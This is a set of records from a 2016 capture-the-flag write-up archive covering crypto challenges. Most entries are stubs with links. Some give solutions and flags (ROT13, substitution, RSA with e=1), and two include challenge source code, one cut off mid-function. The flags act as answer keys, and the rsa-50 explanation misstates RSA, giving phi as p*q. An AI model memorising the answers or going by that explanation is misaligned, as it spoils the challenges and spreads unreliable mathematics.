{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hackcon-ctf-2016\\crypto\\help-a-n00b-pliz-200", "year": "2016", "name": "help-a-n00b-pliz-200", "writeup": "# Hackcon 2016 : help-a-n00b-pliz\n\n**Category:** Crypto\n**Points:** 200\n**Author:** [Mayank Vachher](https://github.com/mvachher)\n**Description:**\n\nChaman is new to RSA and he was just confirming whether he gave the right parameters to D4RKF0RCE for decrypting his message.\n\nCan you help teach N00b Chaman a lesson plis? ;_;\n\nLink: [data_recovered](data_recovered)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hackcon-ctf-2016\\crypto\\the-hardware-club-300", "year": "2016", "name": "the-hardware-club-300", "writeup": "# Hackcon 2016 : the-hardware-club\n\n**Category:** Crypto\n**Points:** 300\n**Solves:** Medium\n**Author:** [Mayank Vachher](https://github.com/mvachher)\n**Description:**\n\nThe Hardware Club at our Institute _finally thought_ that they could use some kind of encryption to make their communication a little more secure. A need for encrypting their moto _\"Restart the systems to fix 'em!\"_ had finally arisen.\n\nBharyan thought about using and setting up this magical system which goes by the name of RSA to put an end to their woes. He is still a little bit unsure as to how it works though.\n\nHelp him understand his fault!\n\nGenerate Key-Pairs for yourself from [genKeyPair.py](genKeyPair.py) \n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n", "solution_code": "\n# genKeyPair.py\nfrom Cryptodome.PublicKey import RSA\nfrom Crypto.Util.number import long_to_bytes, bytes_to_long\nfrom Cryptodome.Cipher import PKCS1_OAEP\nfrom base64 import b64encode, b64decode\nfrom genLargePrimes import generateLargePrime\n\ndef egcd(a, b):\n    if a == 0:\n        return (b, 0, 1)\n    else:\n        g, y, x = egcd(b % a, a)\n        return (g, x - (b // a) * y, y)\n\ndef modinv(a, m):\n    g, x, y = egcd(a, m)\n    if g != 1:\n        raise Exception('modular inverse does not exist')\n    else:\n        return x % m\n\np = 169530237952573748368189799955682467382981190128045440195079928264906866742107349991159212259885000722467900686913850878305620267449769263730115304350546079431887015026437175510788840243478206301763434168031512699332213142859495368291002844907298298139858769109574355617458546385307241287393358156444715347793\nq = 152588087402514219857833878620153666945304685640627758617917943381504393210558706803164637632719012980584990911366861074062265597247464995913960044489757238590130973545737766726863067136702127127671612008426543868375658445766104812898282701044498346675255344027978615813725491513556318640569390490700167272861\n\nphi_n = (p - 1)*(q - 1)\n\ne2 = generateLargePrime(256)\nwhile 'Failure' in str(e2)[:len('Failure')]:\n    e2 = generateLargePrime(256)\nd2 = modinv(e2, phi_n)\n\nkey2 = RSA.construct((p*q, e2, d2, p, q))\n\nprint \"Private Key:\\n\"\nprint key2.exportKey('PEM')\n\nprint \"Public Key:\\n\"\nprint key2.publickey().exportKey('PEM')\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hackover-ctf-2016\\crypto\\guessr", "year": "2016", "name": "guessr", "writeup": "# Hackover CTF 2016 : guessr\n\n**Category:** crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> We apologize for this challenge's name. Adding \"r\"s to the end is so cyber 2.0. We will soon publish a new name that fits the cyber 3.0! In the meantime you can guess our new namesome random numbers. Stay tuned!\n>\n> `nc challenges.hackover.h4q.it 64500`\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/grocid/CTF/tree/master/Hackover/2016#guessr\n* https://gist.github.com/unicornsasfuel/bd713a2cef64a73d9aed28ea5aa845c2\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hackover-ctf-2016\\crypto\\ish_1", "year": "2016", "name": "ish_1", "writeup": "# Hackover CTF 2016 : ish_1\n\n**Category:** crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> (TODO)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/grocid/CTF/tree/master/Hackover/2016#ish_12-insecure-shell\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hackover-ctf-2016\\crypto\\ish_2", "year": "2016", "name": "ish_2", "writeup": "# Hackover CTF 2016 : ish_2\n\n**Category:** crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> (TODO)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/grocid/CTF/tree/master/Hackover/2016#ish_12-insecure-shell\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hackover-ctf-2016\\crypto\\lets-dance", "year": "2016", "name": "lets-dance", "writeup": "# Hackover CTF 2016 : lets-dance\n\n**Category:** crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> Cyber relationships are the big new thing. Find your elite partner on the cyberspace and have great and clean cybersex. Still there are some weird people who like more traditional relationships. They even enjoy dancing with their partner. Show them what can go wrong with cypher dancing!\n> `nc challenges.hackover.h4q.it 16335`\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hackover-ctf-2016\\crypto\\qr-code", "year": "2016", "name": "qr-code", "writeup": "# Hackover CTF 2016 : qr-code\n\n**Category:** crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> (TODO)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/grocid/CTF/tree/master/Hackover/2016#qr_code\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hackover-ctf-2016\\crypto\\roll-the-dice", "year": "2016", "name": "roll-the-dice", "writeup": "# Hackover CTF 2016 : roll-the-dice\n\n\n**Category:** crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> The new cyber casinos are using high speed digital cyber dices to provide the best available gaming experience. Play a brand new dice game at new levels and win. Please note that you have to upgrade to blockchain 3.0 to receive your profits via a smart contract 2.0.\n>\n> `nc challenges.hackover.h4q.it 1415`\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://insecurity-insa.fr/writeUp\n* https://gist.github.com/c3c/f5b4dc1988c334b5c01b67870d7fc35e\n* https://github.com/grocid/CTF/tree/master/Hackover/2016#rollthedice\n* https://github.com/JulesDT/ctfWriteUps/tree/master/Hackover%202016/RollTheDice%20-%20Crypto%20-%2015%20pts\n* https://github.com/team-bitskrieg/CTF-writeups/blob/master/hackover/crypto/rollthedice/README.md\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hackover-ctf-2016\\crypto\\semsecrace", "year": "2016", "name": "semsecrace", "writeup": "# Hackover CTF 2016 : semsecrace\n\n**Category:** crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> Win the race on the data autobahn! Since autonomous driving is the future of traffic 2.0 you just have a red and a blue button to drive your cyber car. No steering wheel, no gas pedal, no ancient clutch. Take a seat and drive.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://insecurity-insa.fr/writeUp\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hackover-ctf-2016\\crypto\\vigenere", "year": "2016", "name": "vigenere", "writeup": "# Hackover CTF 2016 : vigenere\n\n**Category:** crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> Cryptography 3.0 protects the most critical infrastructure in cyberspace but is way to complicated for brain 1.0. Nobody understands cyber curves, cyber lattices or cyber arx. Until we upgrade to brain 2.0 we should stick to simple things. Take this hardened implementation of the very simple vigenere cipher to protect your cyber assets.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://karabut.com/hackover-ctf-2016-vigenere-writeup.html\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hitb-ctf-amsterdam-2016\\crypto\\capture-mexico-tls-200", "year": "2016", "name": "capture-mexico-tls-200", "writeup": "# HITB CTF Amsterdam 2016 : Can you break TLS?\n\n**Category:** Crypto\n**Points:** 200\n**Solves:** 1\n**File:** [tls_16970cb3b09a9dd01f5b82449d9c1795.tar.gz](tls_16970cb3b09a9dd01f5b82449d9c1795.tar.gz)\n**Description:**\n\nA file containing 101 TLS handshakes. One of them has an error: RSA-CRT fault attack\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://www.cryptologie.net/article/371/fault-attacks-on-rsas-signatures/\n* https://github.com/zack-lau/WriteUps/blob/master/HITB-Facebook-CTF-2016/capture_Mexico-tls/README.md\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hitb-ctf-amsterdam-2016\\crypto\\setting-the-table-200", "year": "2016", "name": "setting-the-table-200", "writeup": "# HITB CTF Amsterdam 2016 : setting-the-table-200\n\n**Category:** Crypto\n**Points:** 200\n**Solves:** \n**Description:**\n\nPresentation of a meal is an important part of the restaurant experience. Show your table setting skills here: 145.111.225.61:37373. If you feel lost, you can find the basic table setting manual here: [download](https://github.com/ctfs/write-ups-2016/tree/master/hitb-ctf-amsterdam-2016/crypto/setting-the-table-200/soup_meat_tea.c)\n\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://ced.pwned.systems/hitb-2016-ctf-misc200-setting-the-table.html\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hitcon-ctf-2016\\crypto\\lets-decrypt-100", "year": "2016", "name": "lets-decrypt-100", "writeup": "# HITCON CTF 2016 : lets-decrypt-100\n\n**Category:** crypto\n**Points:** 100\n**Solves:**\n**Description:**\n\n> nc 52.69.125.71 4443\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://ctfsolutions.blogspot.com/2016/10/hitcon-ctf-2016-lets-decrypt.html\n* https://gophers-in-the-shell.herokuapp.com/hitcon-2016-lets-decrypt-crypto-100pts/\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hitcon-ctf-2016\\crypto\\otp-150", "year": "2016", "name": "otp-150", "writeup": "# HITCON CTF 2016 : otp-150\n\n**Category:** crypto\n**Points:** 150\n**Solves:**\n**Description:**\n\n> nc 52.198.182.219 50216\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://blog.clark.re/2016/10/hitcon-2016-otp-writeup.html\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hitcon-ctf-2016\\crypto\\pake-250", "year": "2016", "name": "pake-250", "writeup": "# HITCON CTF 2016 : pake-250\n\n**Category:** crypto\n**Points:** 250\n**Solves:**\n**Description:**\n\n> nc 52.197.112.79 20431\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\hitcon-ctf-2016\\crypto\\pake-plus-plus-150", "year": "2016", "name": "pake-plus-plus-150", "writeup": "# HITCON CTF 2016 : pake-plus-plus-150\n\n**Category:** crypto\n**Points:** 150\n**Solves:**\n**Description:**\n\n> nc 52.193.41.160 20432\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\icectf-2016\\crypto\\alien-message-40", "year": "2016", "name": "alien-message-40", "writeup": "# IceCTF-2016 : alien-message-40\n\n**Category:** Crypto\n**Points:** 40\n**Description:**\n\nWe found this suspicous image online and it looked like it hadd been planted there by an alien life form. Can you see if you can figure out what they're trying to tell us?\n\n## Writeup\n\nBy Googling `alien message cipher key` and looking at images, the first result contained a dictionary of the sybmols found in the cipher image, and their English translation. Either do this by hand, or as rawsec suggests, check out [this decryption tool](http://www.gotfuturama.com/Interactive/AlienCodec/) online. The image decrypts to form the flag: `IceCTF{good_n3wz_3veryon3_1_l1k3_fu7ur4ma_4nd_th3ir_4maz1ng_3as7er_39g5}`\n\n## Other write-ups and resources\n\n* [RawSec](https://rawsec.ml/en/IceCTF-40-Alien-Message-Cryptography/)\n* https://github.com/Idomin/CTF-Writeups/blob/master/IceCTF/AlienMessage-Crypto-40\n* https://www.youtube.com/watch?v=RYgENiSRbpM\n* http://5k33tz.com/icectf-alien-message/\n* [Japanese](https://ctftime.org/writeup/3816)\n* https://gitlab.com/Babache/writeups/tree/master/CTF/IceCTF2k16/Stage-1/Alien-Message\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\icectf-2016\\crypto\\attack-of-the-hellman-175", "year": "2016", "name": "attack-of-the-hellman-175", "writeup": "# IceCTF-2016 : attack-of-the-hellman-175\n\n**Category:** Crypto\n**Points:** 175\n**Description:**\n\nWe managed to intercept a flag transmission but it was encrypted :(. We got the Diffie-Hellman public key exchange parametersand some scripts they used for the transmission along with the encrypted flag. Can you get it for us?\n\n## Writeup\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/grocid/CTF/tree/master/IceCTF/2016#attack-of-the-hellman-200-p\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\icectf-2016\\crypto\\back-at-it-again-200", "year": "2016", "name": "back-at-it-again-200", "writeup": "# IceCTF-2016 : back-at-it-again-200\n\n**Category:** Crypto\n**Points:** 200\n**Description:**\n\nSteve's back at it again with them keys! Can you get it this time? He cleaned up his broken keys on GitHub from last year, but didn't replace them. He must have shared them somehow with a friend, who gave him an account at shell.icec.tf. Can you get access?\n\n## Writeup\n\n(TODO)\n\n## Other write-ups and resources\n\n* None yet"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\icectf-2016\\crypto\\contract-130", "year": "2016", "name": "contract-130", "writeup": "# IceCTF-2016 : contract-130\n\n**Category:** Crypto\n**Points:** 130\n**Description:**\n\nOur contractors stole the flag! They put it on their file server and challenged us to get it back. Can you do it for us? nc contract.vuln.icec.tf 6002 server.py. We did intercept someone connecting to the server though, maybe it will help.contract.pcapng\n\n## Writeup\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://nknxnc.github.io/writeup/2016/08/19/icectf-contract-writeup.html\n* http://itemize.no/2016/08/26/IceCTF-contract-task/\n* https://github.com/grocid/CTF/tree/master/IceCTF/2016#contract-130-p\n* https://github.com/TeamContagion/CTF-Write-Ups/tree/master/icectf-2016/Crypto/Contract\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\icectf-2016\\crypto\\flagstaff-120", "year": "2016", "name": "flagstaff-120", "writeup": "# IceCTF-2016 : flagstaff-120\n\n**Category:** Crypto\n**Points:** 120\n**Description:**\n\nSomeone hid his flag here... guess we better give up. nc flagstaff.vuln.icec.tf 6003\n\n## Writeup\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/grocid/CTF/tree/master/IceCTF/2016#flagstaff-160-p\n* https://github.com/TeamContagion/CTF-Write-Ups/tree/master/icectf-2016/Crypto/Flagstaff\n* [Japanese](https://ctftime.org/writeup/3820)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\icectf-2016\\crypto\\l33tcrypt-90", "year": "2016", "name": "l33tcrypt-90", "writeup": "# IceCTF-2016 : l33tcrypt-90\n\n**Category:** Crypto\n**Points:** 90\n**Description:**\n\nl33tcrypt is a new and fresh encryption service. For added security it pads all information with the flag! Can you get it? nc l33tcrypt.vuln.icec.tf 6001 server.py\n\n## Writeup\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/73696e65/ctf-notes/blob/master/2016-IceCTF/l33tcrypt-Cryptography-90-solution.py\n* https://pastebinthehacker.blogspot.com.au/2016/08/icectf-leet-crypto.html\n* https://github.com/grocid/CTF/tree/master/IceCTF/2016#l33tcrypt-90-p\n* https://github.com/TeamContagion/CTF-Write-Ups/tree/master/icectf-2016/Crypto/l33tcrypt\n* [Japanese](https://ctftime.org/writeup/3818)\n* https://gitlab.com/fraf0/writeups/tree/master/IceCTF/2016/l33tcrypt\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\icectf-2016\\crypto\\over-the-hill-65", "year": "2016", "name": "over-the-hill-65", "writeup": "# IceCTF-2016 : over-the-hill-65\n\n**Category:** Crypto\n**Points:** 65\n**Description:**\n\nOver the hills and far away... many times I've gazed, many times been bitten. Many dreams come true and some have silver linings, I live for my dream of a decrypted flag. crypted\n\n## Writeup\n\n(TODO)\n\n## Other write-ups and resources\n\n* [RawSec](https://rawsec.ml/en/IceCTF-65-Over-the-Hill-Cryptography/)\n* https://kinyabitch.wordpress.com/2016/08/26/icectf-cryptography-hill-cipher/\n* [Japanese](https://ctftime.org/writeup/3819)\n* https://github.com/grocid/CTF/tree/master/IceCTF/2016#over-the-hill-65-p\n* https://github.com/bburky/mathematica-ctf-writeups/blob/master/Hill%20cipher/\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\icectf-2016\\crypto\\rotated-20", "year": "2016", "name": "rotated-20", "writeup": "# IceCTF-2016 : rotated-20\n\n**Category:** Crypto\n**Points:** 20\n**Description:**\n\nThey went and ROTated the flag by 5 and then ROTated it by 8! The scoundrels! Anyway once they were done this was all that was left VprPGS{jnvg_bar_cyhf_1_vf_3?}\n\n## Writeup\n\nThe most classic cipher is ceasar cipher, and with the keyword rotate (ROT), there's a good chance it's a ceasar cipher. Because cipher rotations add up, 5 and 8 combine to make 13. ROT13 is also a very common rotation for ceasar ciphers based on a shift of 1/2 the length of the alphabet. Using an online ceasar cipher solver with a shift of 13 (or a Python script like rawsec), you'll get the result `IceCTF{wait_one_plus_1_is_3?}`\n\n## Other write-ups and resources\n\n* [RawSec](https://rawsec.ml/en/IceCTF-20-Rotated-Cryptograhy/)\n* https://github.com/Idomin/CTF-Writeups/blob/master/IceCTF/Rotated-Crypto-20\n* http://5k33tz.com/icectf-rotated/\n* https://github.com/TeamContagion/CTF-Write-Ups/tree/master/icectf-2016/Crypto/Rotated\n* (Japanese)[https://ctftime.org/writeup/3806]\n* https://gitlab.com/Babache/writeups/tree/master/CTF/IceCTF2k16/Stage-1/Rotated\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\icectf-2016\\crypto\\round-rabins-70", "year": "2016", "name": "round-rabins-70", "writeup": "# IceCTF-2016 : round-rabins-70\n\n**Category:** Crypto\n**Points:** 70\n**Description:**\n\nJohn gave up on RSA and moved to Rabin. ...he still did it wrong though flag.txt. What a box!\n## Writeup\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/WCSC/writeups/tree/master/icectf-2016/Round-Rabins\n* https://github.com/grocid/CTF/tree/master/IceCTF/2016#round-rabins-70-p\n* https://github.com/bburky/mathematica-ctf-writeups/blob/master/Rabin%20cipher/\n"}
{"source": "write-ups-2016", "category": "RSA", "path": "data\\write-ups-2016\\icectf-2016\\crypto\\rsa-50", "year": "2016", "name": "rsa-50", "writeup": "# IceCTF-2016 : rsa-50\n\n**Category:** Crypto\n**Points:** 50\n**Description:**\n\nJohn was messing with RSA again... he encrypted our flag! I have a strong feeling he had no idea what he was doing however, can you get the flag for us? flag.txt\n\n## Writeup\n\nUsing the [wikipedia page for RSA](https://en.wikipedia.org/wiki/RSA_%28cryptosystem%29) as reference, `p` and `q` are our two prime numbers which multiply to make the public modulus `N`. The letter `c` represents the encryption key, and letter `d` represents the decryption key. In terms of math, the modulus operator uses two numbers, ex. `A mod B` (or in programming usually `A % B`). This operator divides `A` by `B` and returns the remainder. Therefore, `11 mod 5` would equal `1`, because `5` goes into `11` twice (to make 10) and has a remainder of `1` (`11 - 10`). Modulus is an useful operator only when `A` is greater than `B`. The description mentions John doesn't know what he is doing with RSA, which is evident in the cipher. Wikipedia tells us the following formulas:\n\n```\nN = p * q\ne * d = 1 mod phi\nphi = p * q\n```\n\nWe have `N`, `e`, and `c` from [`flag.txt`](flag.txt). We call see that `e` is `1` (which is just converting hexadecimal to decimal). So we can fill in part of the equation so that `1 * d = 1 mod phi`, which simplifies to `d = 1 mod phi`. Also, since `N = p * q` and `N` is a very large number, it is safe to assume that `p` and `q` are relatively large prime numbers. Therefore, it's possible to imagine `phi` is also a large number based on `p` and `q` (definately larger than `1`). Since `d = 1 mod phi`, and we assume `phi` is larger than 1, we know the modulus operation will simply return `1` because the right side is greater than the left. This is where John went wrong. Now, `d = 1`. With this decryption key, it is mathematically reasonable to do it by hand, but computers were invented for a reason; WCSC suggests you use the [online RSA tool](http://nmichaels.org/rsa.py). Simply enter `N` for the `Public Modulus` field, `e` for the `Public Exponent` field, `d` for the `Private Exponent` field, and lastly `c` in the `Text` field. Don't forget to check the `Hexadecimal` radio button before hitting `Decrypt`. The text field should then output `IceCTF{falls_apart_so_easily_and_reassembled_so_crudely}`\n\n## Other write-ups and resources\n\n* https://github.com/WCSC/writeups/tree/master/icectf-2016/RSA1\n* https://capturetheflags.blogspot.in/2016/08/icectf-2016-rsa.html\n* [Japanese](https://ctftime.org/writeup/3811)\n* https://github.com/grocid/CTF/tree/master/IceCTF/2016#rsa-50-p\n* https://www.youtube.com/watch?v=k9hiLH3i9Rw&feature=youtu.be\n"}
{"source": "write-ups-2016", "category": "RSA", "path": "data\\write-ups-2016\\icectf-2016\\crypto\\rsa-60", "year": "2016", "name": "rsa-60", "writeup": "# IceCTF-2016 : rsa-60\n\n**Category:** Crypto\n**Points:** 60\n**Description:**\n\nThis time John managed to use RSA \" correctly \"... I think he still made some mistakes though.\n\n## Writeup\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Japanese](https://ctftime.org/writeup/3817)\n* https://github.com/grocid/CTF/tree/master/IceCTF/2016#rsa-60-p\n* https://github.com/Ctf-Trinidad/WRITEUPS/tree/master/2016.08.IceCTF/RSA\n* https://www.youtube.com/watch?v=WX9nvoGcHUE\n"}
{"source": "write-ups-2016", "category": "RSA", "path": "data\\write-ups-2016\\icectf-2016\\crypto\\rsa2-90", "year": "2016", "name": "rsa2-90", "writeup": "# IceCTF-2016 : rsa2-90\n\n**Category:** Crypto\n**Points:** 90\n**Description:**\n\nI guess the 3rd time is the charm? Or not... flag.txt\n\n## Writeup\n\n(TODO)\n\n## Other write-ups and resources\n\n* <https://github.com/WCSC/writeups/tree/master/icectf-2016/RSA2> \n* [Japanese](https://ctftime.org/writeup/3803)\n* https://github.com/grocid/CTF/tree/master/IceCTF/2016#rsa2-60-p\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\icectf-2016\\crypto\\sand-castles-on-the-beach-140", "year": "2016", "name": "sand-castles-on-the-beach-140", "writeup": "# IceCTF-2016 : sand-castles-on-the-beach-140\n\n**Category:** Crypto\n**Points:** 140\n**Description:**\n\nWe found this very mysterious image, it doesn't look complete and there seems to be something hidden on it... does this mean anything to you? sandcastle.png. This flag is not in the standard flag format. The flag contains digits and no special characters, convert the message to lowercase and then add IceCTF{message} to it. 10331c4d\n\n## Writeup\n\n(TODO)\n\n## Other write-ups and resources\n\n* [0x90r00t](https://0x90r00t.com/2016/08/26/icectf-2016-crypto-140-sand-castle-write-up/)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\icectf-2016\\crypto\\substituted-30", "year": "2016", "name": "substituted-30", "writeup": "# IceCTF-2016 : substituted-30\n\n**Category:** Crypto\n**Points:** 30\n**Description:**\n\nWe got a substitute flag, I hear they are pretty lax on the rules\n\n## Writeup\n\nThe use of the word `substitute` indicates that this may be a substitution cipher. This one happens to be based on letter frequency, so a quick Google search will pull up an English letter frequency list. Either manually, or using a Python script (like rawsec) substituting each letter for its partner in frequency, you will get the following output:\n\n```\nHi!\n\nWelcome to IceCTF!\n\nI'll be your substitute flag for the day. For today, we are studying basic cryptography and its applications. Cryptography has a long history, although with the advent of computers it has gotten really complicated. Some simple old ciphers are the Caesar cipher, the Vigenere cipher, the substitution cipher, which is this one, and so on. Almost all of these ciphers are easily broken today with the help of computers. Some new encryption methods are AES, the current standard for encryption, along with RSA. Cryptography is a vast field and is very interesting though. So kick back, read up on some cool ciphers and have fun!\n\nOh and for your records my name is IceCTF{always_listen_to_your_substitute_flags}.\n```\n\n## Other write-ups and resources\n\n* [RawSec](https://rawsec.ml/en/IceCTF-30-Substituted-Cryptography/)\n* https://youtu.be/xQJ4Ndke9HM\n* http://5k33tz.com/icectf-substituted/\n* https://github.com/TeamContagion/CTF-Write-Ups/tree/master/icectf-2016/Crypto/Substituted\n* [Japanese](https://ctftime.org/writeup/3807)\n"}
{"source": "write-ups-2016", "category": "RSA", "path": "data\\write-ups-2016\\icectf-2016\\forensics\\intercepted-conversations-pt1-110", "year": "2016", "name": "intercepted-conversations-pt1-110", "writeup": "# IceCTF-2016 : intercepted-conversations-pt1-110\n\n**Category:** Forensics\n**Points:** 110\n**Description:**\n\nThis traffic was picked up by one of our agents. We think this might be a conversation between two elite hackers that we are investigating. Can you see if you can analyze the data? intercept.pcapng\n\n## Writeup\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://www.cyberteam6.net/2016/08/26/icectf-2016-n1d3n-2/#more-35\n* http://lab.insightsecurity.com.br/writeup-intercepted-conversations-pt-1-icectf-2016/\n* https://github.com/WCSC/writeups/tree/master/icectf-2016/intercepted_1\n* [Invulnerable (Russian)](http://countersite.org/articles/net/111-intercepted-conversations-pt1.html)\n"}
{"source": "write-ups-2016", "category": "RSA", "path": "data\\write-ups-2016\\icectf-2016\\forensics\\intercepted-conversations-pt2-125", "year": "2016", "name": "intercepted-conversations-pt2-125", "writeup": "# IceCTF-2016 : intercepted-conversations-pt2-125\n\n**Category:** Forensics\n**Points:** 125\n**Description:**\n\nWe managed to intercept more of the hacker's traffic, unfortunately since our last encounter they have figured out that they're being watched. They've gotten more clever in their communication so we need you to try to make sense of this traffic.\n\n## Writeup\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://gist.github.com/duckythescientist/1a43e38999fadbb9aa38dc385734c1eb\n* https://github.com/73696e65/ctf-notes/blob/master/2016-IceCTF/Intercepted_Conversations_Pt.2-Forensics-125.txt\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\insomnihack-ctf-2016\\crypto\\pcapbleeding", "year": "2016", "name": "pcapbleeding", "writeup": "# Insomni'hack CTF 2016 : PCAPBleeding\n\n**Category:** Crypto\n**Author:** julien\n**Difficulty:** Medium\n**Solves:** 16\n**Description:**\n\n> Finally, somebody has read our 2014 log files. We think an attack occurred on our HTTPS server but we don't know if they succeed in stealing valuable information. Some confidential data pass through this SSL channels so we hope it's not broken :~\n>\n> The flag format is INS={some random string here}.\n>\n> [pcapbleeding](./pcapbleeding_0c5102ad4b1c035b40f501a3e5b7d4f8.zip)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* <http://cybermashup.com/2016/03/21/insomnihack-2016-pcapbleeding-writeup/>\n* <https://github.com/hexpresso/WU-2016/tree/master/insomnihack-ctf-2016/crypto/pcapbleeding>\n* <https://duksctf.github.io/Inso2016-pcapbleeding/>\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\insomnihack-teaser-2016\\crypto\\bring-the-noise-200", "year": "2016", "name": "bring-the-noise-200", "writeup": "# Insomni'hack Teaser CTF 2016 : Bring the noise\n\n**Category:** Crypto\n**Points:** 200\n**Author:** veorg\n**Solves:** 173\n**Description:**\n\n> Quantum computers won't help you\n>\n> [Source](./server-bd6a6586808ab28325de37276aa99357.py)\n>\n> Running on: bringthenoise.insomnihack.ch:1111\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [CTF.RIP](https://ctf.rip/insomnihack-teaser-2016-bring-the-noise-crypto-200-pts/)\n* <https://cryptsec.wordpress.com/2016/01/18/insomnihack-teaser-write-up-bring-the-noise-crypto-200/>\n* <https://0x1337seichi.wordpress.com/2016/01/17/insomnihack-2016-ctf-teaser-bring-the-noise-crypto-200/>\n* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/Insomnihack/crypto/bring-the-noise-200.md#insomnihack-2016--crypto-200>\n* <https://gist.github.com/xtrm0/763e9b4ffa6d32dd65dd>\n* <https://gist.github.com/anonymous/ee1ab888705c13efb539>\n* <https://gist.github.com/elliptic-shiho/935540b52e06a526f396>\n* <https://github.com/raccoons-team/ctf/tree/master/2016-01-16-insomnihack-teaser/crypto_200_bring_the_noise>\n* <https://gist.github.com/fbonzon/480a1c7877a34d9f3e93>\n* <https://adriancohea.ninja/bring-the-noise-insomnihack-teaser-2016/>\n", "solution_code": "\n# server-bd6a6586808ab28325de37276aa99357.py\n#!/usr/bin/env python\n\nimport SocketServer as ss\nimport struct\nimport os\nfrom binascii import hexlify\nimport hashlib\n\nFLAG = open('flag').read()\nPOWLEN = 5\n\n\ndef randint(bound):\n    return struct.unpack('<L', os.urandom(4))[0] % bound\n\n\ndef learn_with_vibrations():\n    q, n, eqs = 8, 6, 40\n    solution = [randint(q) for i in range(n)]\n    equations = []\n    for i in range(eqs):\n        coefs = [randint(q) for i in range(n)]\n        result = sum([solution[i]*coefs[i] for i in range(n)]) % q\n        vibration = randint(3) - 1\n        result = (result + q + vibration) % q\n        equations.append('%s, %d' % (str(coefs)[1:-1], result))\n    return equations, solution\n\n\nclass Handler(ss.StreamRequestHandler):\n\n    def handle(self):\n        put = self.wfile.write\n\n        challenge = hexlify(os.urandom(1+POWLEN/2))[:POWLEN]\n        put('Challenge = %s\\n' % challenge)\n        response = self.rfile.readline()[:-1]\n        responsehash = hashlib.md5(response).hexdigest().strip()\n        if responsehash[:POWLEN] != challenge:\n            put('Wrong\\n')\n            return\n\n        equations, solution = learn_with_vibrations()\n        for equation in  equations:\n            put(equation + '\\n')\n\n        put('Enter solution as \"1, 2, 3, 4, 5, 6\"\\n')\n\n        sol = self.rfile.readline().strip()\n        if sol != str(solution)[1:-1]:\n            put('Wrong\\n')\n            